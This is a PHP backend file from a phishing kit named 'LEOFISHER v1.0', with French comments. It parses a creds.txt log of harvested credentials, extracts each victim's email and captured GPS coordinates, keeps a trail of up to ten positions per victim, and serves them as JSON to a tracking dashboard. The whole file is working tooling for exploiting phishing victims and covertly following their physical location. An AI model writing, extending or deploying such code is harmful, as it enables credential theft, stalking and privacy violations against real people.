<?php
<?php
// positions.php - ADAPTÉ EXACTEMENT à ton gps-dashboard.php parseur
// Compatible format LEOFISHER v1.0 ┌─[ LEOFISHER v1.0 by Léo Falcon ]
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
date_default_timezone_set('Africa/Bujumbura');

$creds_file = 'creds.txt';
$victims = [];

if (!file_exists($creds_file) || filesize($creds_file) == 0) {
    echo json_encode([]);
    exit;
}

$logs = file_get_contents($creds_file);
$entries = explode("┌─[ LEOFISHER v1.0 by Léo Falcon ]", $logs);

// Parseur IDENTIQUE à ton gps-dashboard.php + stockage trajectoires
$victimTrails = []; // email => array of positions

foreach ($entries as $entry) {
    // 📧 Email extraction
    if (preg_match('/📧 .*? : (.*?)\n/', $entry, $email_match)) {
        $email = trim($email_match[1]);
        $email = strtolower($email);
        
        // 📍 GPS multi-positions
        if (preg_match_all('/📍 GPS POSITION : ([-+]?\d+\.?\d*), ([-+]?\d+\.?\d+)/', $entry, $gps_matches, PREG_SET_ORDER)) {
            foreach ($gps_matches as $gps_match) {
                $lat = floatval($gps_match[1]);
                $lng = floatval($gps_match[2]);
                
                // Validation GPS stricte
                if ($lat != 0 && $lng != 0 && abs($lat) <= 90 && abs($lng) <= 180) {
                    if (!isset($victimTrails[$email])) {
                        $victimTrails[$email] = [];
                    }
                    $victimTrails[$email][] = [
                        'lat' => $lat,
                        'lng' => $lng,
                        'time' => date('H:i:s')
                    ];
                    
                    // Garde MAX 10 positions par victime (ton cahier des charges)
                    if (count($victimTrails[$email]) > 10) {
                        array_shift($victimTrails[$email]);
                    }
                }
            }
        }
    }
}

// Format EXACT pour gps-dashboard.php
foreach ($victimTrails as $email => $positions) {
    if (!empty($positions)) {
        $latest = end($positions); // Dernière position
        $victims[] = [
            'id' => $email,
            'email' => $email,
            'latest' => [$latest['lat'], $latest['lng'], $latest['time']], // [lat, lng, time]
            'positions' => array_map(function($p) {
                return [$p['lat'], $p['lng']]; // [[lat,lng], [lat,lng]...]
            }, $positions),
            'ip' => 'from_LEOFISHER_logs', // Compatible avec ton popup
            'count' => count($positions) // Nb positions pour popup
        ];
    }
}

echo json_encode($victims, JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT);
?>
